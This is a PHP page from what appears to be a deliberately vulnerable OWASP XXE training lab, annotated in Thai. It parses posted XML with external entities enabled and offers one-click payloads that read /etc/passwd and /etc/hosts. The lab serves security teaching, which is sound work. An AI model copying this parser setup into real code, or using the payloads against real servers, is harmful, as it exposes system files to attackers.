<?php
/*
 * OWASP A05 — XML / XXE Injection Lab (PHP)
 * ==========================================
 * ❌ VULNERABLE MODE
 *
 * parse XML โดยไม่ disable external entities
 * → ผู้โจมตีแทรก <!ENTITY> เพื่ออ่านไฟล์ระบบ
 */

$output  = '';
$error   = '';
$xml_in  = '';

// Default XXE payload example
$default_xml = '<?xml version="1.0" encoding="UTF-8"?>
<order>
  <item>Widget A</item>
  <quantity>2</quantity>
  <note>Normal order</note>
</order>';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml_in = $_POST['xml_input'] ?? '';

    if (!empty($xml_in)) {
        // =========================================================
        // ❌ VULNERABLE: parse XML โดยไม่ disable external entities
        // LIBXML_NOENT   → แทนที่ entity ด้วยค่าจริง (อันตราย!)
        // LIBXML_DTDLOAD → โหลด DTD external (อันตราย!)
        // =========================================================
        libxml_use_internal_errors(true);

        $dom = new DOMDocument();
        $dom->loadXML(
            $xml_in,
            LIBXML_NOENT | LIBXML_DTDLOAD   // ← อันตราย!
        );

        $errors = libxml_get_errors();
        libxml_clear_errors();

        if (!empty($errors)) {
            $error = 'XML Parse Error: ' . $errors[0]->message;
        } else {
            $output = $dom->saveXML();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>XML/XXE Injection Lab — VULNERABLE</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Inter',sans-serif;background:#030712;color:#f0f6fc;min-height:100vh}
    .header{background:rgba(255,255,255,.04);border-bottom:1px solid rgba(255,255,255,.08);padding:16px 32px;display:flex;align-items:center;gap:16px}
    .mb{padding:4px 12px;border-radius:100px;font-size:12px;font-weight:700;background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3)}
    .title{font-size:18px;font-weight:700}
    .sw{margin-left:auto;color:#6366f1;text-decoration:none;font-size:13px;font-weight:600}
    .bl{color:#8b949e;text-decoration:none;font-size:13px}
    .container{max-width:1000px;margin:0 auto;padding:40px 24px}
    .card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:32px;margin-bottom:24px}
    h2{font-size:20px;font-weight:700;margin-bottom:8px}
    .desc{color:#8b949e;font-size:14px;margin-bottom:24px;line-height:1.6}
    label{display:block;font-size:13px;font-weight:600;color:#8b949e;margin-bottom:6px}
    textarea{width:100%;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:12px 14px;color:#f0f6fc;font-size:13px;font-family:'JetBrains Mono',monospace;outline:none;margin-bottom:16px;min-height:200px;resize:vertical}
    textarea:focus{border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,.15)}
    button{background:linear-gradient(135deg,#6366f1,#a855f7);border:none;color:#fff;padding:10px 24px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
    button:hover{opacity:.85}
    .cb{background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.07);border-radius:8px;padding:16px;margin:16px 0;overflow-x:auto}
    code{font-family:'JetBrains Mono',monospace;font-size:12px;color:#7dd3fc}
    .hl{color:#f97316}
    .hint-box{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:8px;padding:12px 16px;margin-bottom:16px}
    .hint-box p{font-size:12px;color:#fcd34d;margin-bottom:6px}
    .hint-box code{color:#f97316}
    .res{margin-top:24px;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:20px}
    .res h3{font-size:15px;font-weight:700;margin-bottom:12px;color:#a78bfa}
    .output{font-family:'JetBrains Mono',monospace;font-size:12px;color:#86efac;white-space:pre-wrap;word-break:break-all}
    .error{color:#f87171;font-size:13px;padding:12px;background:rgba(239,68,68,.1);border-radius:8px;border:1px solid rgba(239,68,68,.2)}
    .payload-tabs{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
    .pt{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#f87171;padding:6px 12px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;transition:all .2s}
    .pt:hover{background:rgba(239,68,68,.2)}
  </style>
  <link rel="stylesheet" href="http://localhost:8080/service-theme.css">
  <script src="http://localhost:8080/service-theme.js"></script>
</head>
<body>
<div class="header">
  <a href="http://localhost:8080" class="bl">← Dashboard</a>
  <span class="title">📦 XML/XXE Injection</span>
  <span class="mb">🔴 VULNERABLE</span>
  <a href="/secure.php" class="sw">→ ดูโหมด Secure</a>
</div>

<div class="container">
<div class="card">
  <h2>🔴 Vulnerable: XML Parser (XXE Enabled)</h2>
  <p class="desc">
    XML parser นี้ใช้ <strong>LIBXML_NOENT | LIBXML_DTDLOAD</strong> —
    ทำให้ External Entity ทำงานได้ ผู้โจมตีสามารถอ่านไฟล์บนเซิร์ฟเวอร์ได้โดยตรง
  </p>

  <div class="cb">
    <pre><code><span class="hl">// ❌ VULNERABLE REQUEST HANDLER (PHP)</span>
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml_in = $_POST['xml_input'] ?? '';

    if (!empty($xml_in)) {
        libxml_use_internal_errors(true);
        $dom = new DOMDocument();
        
        // ❌ โหลด XML โดยเปิด Flag NOENT และ DTDLOAD ทำให้อนุญาตการเรียกใช้ External Entity (XXE)
        $dom->loadXML(
            $xml_in,
            LIBXML_NOENT | LIBXML_DTDLOAD
        );
        
        $errors = libxml_get_errors();
        libxml_clear_errors();
        
        if (!empty($errors)) {
            $error = 'XML Parse Error: ' . $errors[0]->message;
        } else {
            $output = $dom->saveXML();
        }
    }
}</code></pre>
  </div>

  <div class="hint-box">
    <p>💡 ลอง XXE Payloads — คลิกเพื่อ load:</p>
    <div class="payload-tabs">
      <button class="pt" id="payload-passwd" onclick="loadPayload('passwd')">📖 อ่าน /etc/passwd</button>
      <button class="pt" id="payload-hosts" onclick="loadPayload('hosts')">📖 อ่าน /etc/hosts</button>
      <button class="pt" id="payload-normal" onclick="loadPayload('normal')">📄 Normal XML</button>
    </div>
  </div>

  <form method="POST" action="/vulnerable.php" id="xml-form">
    <label>XML Input:</label>
    <textarea name="xml_input" id="xml-input"><?= htmlspecialchars($xml_in ?: $default_xml) ?></textarea>
    <button type="submit" id="parse-btn">🚀 Parse XML (Vulnerable)</button>
  </form>

  <?php if (!empty($output)): ?>
    <div class="res">
      <h3>📋 XML Parsed Output:</h3>
      <pre class="output"><?= htmlspecialchars($output) ?></pre>
    </div>
  <?php endif; ?>

  <?php if (!empty($error)): ?>
    <div class="error">⚠️ <?= htmlspecialchars($error) ?></div>
  <?php endif; ?>
</div>
</div>

<script>
const payloads = {
  passwd: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <item>Order #1234</item>
  <note>&xxe;</note>
</data>`,
  hosts: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<data>
  <item>Order #5678</item>
  <note>&xxe;</note>
</data>`,
  normal: `<?xml version="1.0" encoding="UTF-8"?>
<order>
  <item>Widget A</item>
  <quantity>2</quantity>
  <note>Normal order — no injection</note>
</order>`
};

function loadPayload(type) {
  document.getElementById('xml-input').value = payloads[type];
}
</script>
</body>
</html>
